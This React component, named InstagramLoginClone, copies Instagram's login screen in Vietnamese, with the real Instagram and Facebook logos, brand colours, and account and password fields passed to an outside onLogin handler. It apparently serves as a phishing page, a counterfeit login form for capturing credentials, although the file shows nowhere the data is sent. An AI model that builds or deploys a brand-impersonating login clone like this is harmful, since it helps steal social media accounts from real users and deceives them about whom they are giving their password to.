import React from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Loader } from 'lucide-react';
import instagramLogo from '@/assets/social/instagram.svg';
import facebookLogo from '@/assets/social/facebook.svg';

const InstagramLoginClone = ({ onLogin, isLoading }) => (
    <div className="bg-white p-6 rounded-lg text-black w-full text-center flex flex-col justify-center">
        <img src={instagramLogo} alt="Instagram" className="h-16 w-auto mx-auto mb-6" />
        <form onSubmit={onLogin} className="space-y-2">
            <Input id="account" name="account" type="text" placeholder="Số điện thoại, tên người dùng hoặc email" required className="h-10 bg-gray-50 border-gray-300 text-black" disabled={isLoading} />
            <Input id="password" name="password" type="password" placeholder="Mật khẩu" required className="h-10 bg-gray-50 border-gray-300 text-black" disabled={isLoading} />
            <Button type="submit" className="w-full bg-[#0095F6] hover:bg-[#0085e6] text-white font-semibold" disabled={isLoading}>
                {isLoading ? <Loader className="h-4 w-4 animate-spin" /> : 'Đăng nhập'}
            </Button>
        </form>
        <div className="flex items-center my-4">
            <div className="flex-grow border-t border-gray-300"></div>
            <span className="flex-shrink mx-4 text-gray-500 text-sm font-semibold">HOẶC</span>
            <div className="flex-grow border-t border-gray-300"></div>
        </div>
        <Button variant="ghost" className="text-[#385185] font-semibold">
            <img src={facebookLogo} alt="Facebook" className="h-5 w-5 mr-2" />
            Đăng nhập bằng Facebook
        </Button>
        <button className="text-xs text-center block mt-3 text-[#00376B] mx-auto">Quên mật khẩu?</button>
    </div>
);

export default InstagramLoginClone;